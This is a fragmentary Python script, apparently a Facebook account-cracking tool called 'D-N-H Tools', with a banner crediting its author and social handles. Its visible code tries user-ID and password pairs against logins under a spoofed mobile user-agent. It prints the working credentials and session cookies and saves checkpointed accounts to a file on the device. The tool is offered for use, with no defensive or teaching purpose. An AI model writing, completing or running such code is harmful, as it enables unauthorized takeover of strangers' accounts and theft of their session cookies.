...
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO D-N-H Tools               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID/Today free
\033[1;32m[-] AUTHOR    :\033[1;32m Faysal
\033[1;32m[-] GITHUB    :\033[1;32m Faysalsf
\033[1;32m[-] FACEBOOK  :\033[1;32m Faysal Ahmed 
\033[1;92m══════════════════════════════════════════
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[D-N-H -OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Faysal-CP❌] {uid}|{ps}")
                open('/sdcard/Faysal-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[D-N-H FAYSAL💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
